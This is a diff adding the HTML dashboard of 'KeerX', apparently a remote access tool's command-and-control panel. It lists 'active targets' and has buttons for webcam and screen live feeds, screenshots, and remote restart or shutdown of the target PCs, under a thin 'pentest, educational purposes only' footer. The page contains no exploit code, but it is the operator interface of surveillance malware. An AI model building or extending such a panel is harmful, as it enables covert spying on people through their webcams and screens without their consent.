@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KeerX Control Center</title>
+    <link rel="stylesheet" href="style.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div class="background-overlay"></div>
+
+    <div class="app-container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">
+                <span class="glitch" data-text="KEERX">KEERX</span>
+            </div>
+            <div class="client-list-header">
+                <h4>ACTIVE TARGETS</h4>
+                <button class="refresh-btn" onclick="fetchClients()">🔄</button>
+            </div>
+            <ul id="client-list" class="client-list">
+                <li class="loading">Searching for targets...</li>
+            </ul>
+        </aside>
+
+        <div class="main-content">
+            <header>
+                <div class="current-target">
+                    <span class="label">TARGET:</span>
+                    <span id="target-id-display">None Selected</span>
+                </div>
+                <div class="server-status">
+                    <button class="config-btn" onclick="openConfig()" title="C2 Configuration">⚙️</button>
+                    <span class="status-dot online"></span>
+                    <span id="status-text">SERVER ONLINE</span>
+                </div>
+            </header>
+
+            <main>
+                <div class="dashboard-grid">
+                    <!-- Live Feed Card -->
+                    <section class="card live-card">
+                        <div class="card-header">
+                            <h3><i class="icon-video"></i> LIVE FEED</h3>
+                            <div class="feed-controls">
+                                <button class="btn-micro" onclick="sendCommand('LIVE_FEED_ON')">START</button>
+                                <button class="btn-micro" onclick="sendCommand('LIVE_FEED_OFF')">STOP</button>
+                                <button class="btn-micro" id="feed-toggle-btn"
+                                    onclick="toggleFeedType()">SCREEN</button>
+                            </div>
+                        </div>
+                        <div class="video-container">
+                            <img id="live-player" src="" alt="Live Feed" style="display: none;">
+                            <div id="player-placeholder" class="placeholder">
+                                <p>OFFLINE</p>
+                            </div>
+                        </div>
+                    </section>
+
+                    <!-- Control Card -->
+                    <section class="card control-card">
+                        <h3><i class="icon-camera"></i> Surveillance</h3>
+                        <div class="button-group">
+                            <button class="btn btn-primary" onclick="sendCommand('SCREENSHOT')">
+                                <span class="btn-text">One-time Screenshot</span>
+                                <span class="btn-icon">📸</span>
+                            </button>
+                            <button class="btn btn-primary" onclick="sendCommand('WEBCAM_ON')">
+                                <span class="btn-text">Webcam Mode</span>
+                                <span class="btn-icon">👁️</span>
+                            </button>
+                            <button class="btn btn-primary" onclick="sendCommand('SCREEN_MODE')">
+                                <span class="btn-text">Screen Mode</span>
+                                <span class="btn-icon">🖥️</span>
+                            </button>
+                        </div>
+                    </section>
+
+                    <!-- System Control Card -->
+                    <section class="card system-card">
+                        <h3><i class="icon-settings"></i> Power Actions</h3>
+                        <div class="button-group">
+                            <button class="btn btn-warning" onclick="confirmCommand('RESTART')">
+                                <span class="btn-text">Restart PC</span>
+                                <span class="btn-icon">🔄</span>
+                            </button>
+                            <button class="btn btn-danger" onclick="confirmCommand('SHUTDOWN')">
+                                <span class="btn-text">Shutdown PC</span>
+                                <span class="btn-icon">🔌</span>
+                            </button>
+                        </div>
+                    </section>
+
+                    <!-- Console Log Card -->
+                    <section class="card console-card">
+                        <h3><i class="icon-terminal"></i> Command History</h3>
+                        <div id="command-log" class="console-output">
+                            <p class="log-entry system">[SYSTEM] Dashboard initialized...</p>
+                        </div>
+                    </section>
+                </div>
+            </main>
+
+            <footer>
+                <p>&copy; 2026 KeerX Pentest Framework. For Educational Purposes Only.</p>
+            </footer>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
